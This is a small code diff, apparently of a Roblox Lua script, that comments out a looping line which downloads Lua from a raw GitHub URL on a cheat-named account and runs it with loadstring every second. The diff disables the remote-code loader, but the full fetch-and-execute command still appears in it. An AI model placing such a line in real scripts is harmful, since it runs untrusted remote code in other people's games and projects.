@@ -5683,7 +5683,7 @@ end)
 
 spawn(function()
 	while wait(1) do
-		loadstring(game:HttpGet("https://raw.githubusercontent.com/CheaterMer/23wtrgsngj6eterejutekyhwsaeurt/main/bruhskull"))()
+		--loadstring(game:HttpGet("https://raw.githubusercontent.com/CheaterMer/23wtrgsngj6eterejutekyhwsaeurt/main/bruhskull"))()
 	end
 end)
 
